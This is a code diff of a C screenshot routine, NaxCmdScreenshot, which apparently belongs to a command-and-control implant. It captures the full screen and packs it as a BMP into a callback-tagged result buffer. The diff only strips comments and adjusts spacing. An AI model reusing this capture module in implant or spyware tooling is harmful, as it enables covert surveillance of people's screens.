@@ -25,7 +25,6 @@ FUNC INT NaxCmdScreenshot( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
     INT cy = Nax->User32.GetSystemMetrics( NX_SM_CYSCREEN );
     if ( cx <= 0 || cy <= 0 ) return NAX_ERR_FAIL;
 
-    /* Capture screen */
     HDC     hdcSrc = Nax->User32.GetDC( NULL );
     if ( !hdcSrc ) return NAX_ERR_FAIL;
 
@@ -43,12 +42,10 @@ FUNC INT NaxCmdScreenshot( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
     Nax->Gdi32.SelectObject( hdcMem, hOld );
     Nax->User32.ReleaseDC( NULL, hdcSrc );
 
-    /* Compute sizes */
-    UINT32 stride     = ( (UINT32)cx * 3u + 3u ) & ~3u;   /* DWORD-aligned 24bpp row */
+    UINT32 stride     = ( (UINT32)cx * 3u + 3u ) & ~3u;   
     UINT32 pixel_sz   = stride * (UINT32)cy;
-    UINT32 bmp_sz     = 14u + 40u + pixel_sz;             /* FILEHEADER + INFOHEADER + pixels */
+    UINT32 bmp_sz     = 14u + 40u + pixel_sz;             
 
-    /* Result: [0x81][note_len=0(4)][bmp_len(4)][bmp] */
     UINT32 result_sz  = 1u + 4u + 4u + bmp_sz;
     if ( result_sz > *out_len ) {
         Nax->Gdi32.DeleteObject( hBmp );
@@ -58,13 +55,10 @@ FUNC INT NaxCmdScreenshot( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
 
     PBYTE p = out;
 
-    /* Type tag */
     *p++ = CALLBACK_AX_SCREENSHOT;
 
-    /* note_len = 0 */
     *p++ = 0; *p++ = 0; *p++ = 0; *p++ = 0;
 
-    /* bmp_len */
     NaxW32( p, bmp_sz ); p += 4;
 
     /* BITMAPFILEHEADER (14 bytes) */
@@ -78,8 +72,8 @@ FUNC INT NaxCmdScreenshot( PNAX_INSTANCE Nax, PBYTE out, UINT32* out_len ) {
     NaxW32( p,      40u );              /* biSize             */
     NaxW32( p + 4,  (UINT32)cx );       /* biWidth            */
     NaxW32( p + 8,  (UINT32)cy );       /* biHeight (positive = bottom-up) */
-    p[12] = 1; p[13] = 0;             /* biPlanes = 1       */
-    p[14] = 24; p[15] = 0;            /* biBitCount = 24    */
+    p[12] = 1; p[13] = 0;               /* biPlanes = 1       */
+    p[14] = 24; p[15] = 0;              /* biBitCount = 24    */
     NaxW32( p + 16, 0 );                /* biCompression = BI_RGB */
     NaxW32( p + 20, pixel_sz );         /* biSizeImage        */
     NaxW32( p + 24, 0 );                /* biXPelsPerMeter    */
